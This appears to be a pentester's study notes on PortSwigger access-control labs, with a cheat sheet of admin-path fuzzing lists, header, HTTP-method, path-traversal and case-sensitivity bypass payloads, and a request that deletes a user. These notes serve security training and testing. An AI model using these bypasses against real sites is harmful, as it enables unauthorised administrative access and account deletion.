# Access Control - Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: Unprotected admin functionality
**Status**: SOLVED
**Steps**:
1. `GET /robots.txt` → Disallow: /administrator-panel
2. `GET /administrator-panel` → Access admin without auth
3. `GET /administrator-panel/delete?username=carlos` → Delete user

**Key Lesson**: Check robots.txt for admin paths

### Lab 2: User role controlled by request parameter
**Status**: SOLVED (Lab #25)
**Steps**:
1. Login as wiener
2. `GET /my-account?id=wiener` → Admin=false
3. Change to `GET /my-account?id=wiener&Admin=true`
4. Access admin panel

### Lab 3: URL-based access control can be circumvented
**Bypass methods**:
```
# X-Original-URL header
GET / HTTP/1.1
X-Original-URL: /admin

# X-Rewrite-URL header
GET / HTTP/1.1
X-Rewrite-URL: /admin
```

### Lab 4: Method-based access control bypass
**Bypass methods**:
```
# If GET /admin requires auth, try:
POST /admin HTTP/1.1
# or
GET /admin HTTP/1.1 (without auth header)
```

## Common Admin Paths to Fuzz
```
/admin
/administrator
/admin-panel
/administrator-panel
/management
/manage
/panel
/backend
/console
/dashboard
/system
/internal
/private
```

## Discovery Techniques

### robots.txt
```
GET /robots.txt
# Often contains admin paths in Disallow
```

### Sitemap
```
GET /sitemap.xml
# May contain admin URLs
```

### JavaScript Analysis
```
// Look for admin URLs in JS files
/admin
/api/admin
/v1/admin
```

### Error Pages
```
# Trigger 403/401 to see admin paths in error messages
```

## Bypass Techniques

### 1. Header-based bypass
```
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```

### 2. HTTP method bypass
```
GET → POST → PUT → DELETE → PATCH → OPTIONS
```

### 3. Path traversal bypass
```
/admin
/Admin
//admin
/./admin
/admin/.
/admin..;/
/.;/admin
/admin;/
```

### 4. Case sensitivity bypass
```
/admin → /Admin → /ADMIN → /aDmIn
```

### 5. Parameter pollution
```
/admin?role=user&role=admin
```

## Detection Checklist
- [ ] robots.txt contains admin paths
- [ ] Admin panel accessible without auth
- [ ] URL-based access control headers bypass
- [ ] HTTP method change bypasses auth
- [ ] Path traversal bypasses restrictions
- [ ] Case sensitivity bypasses filters
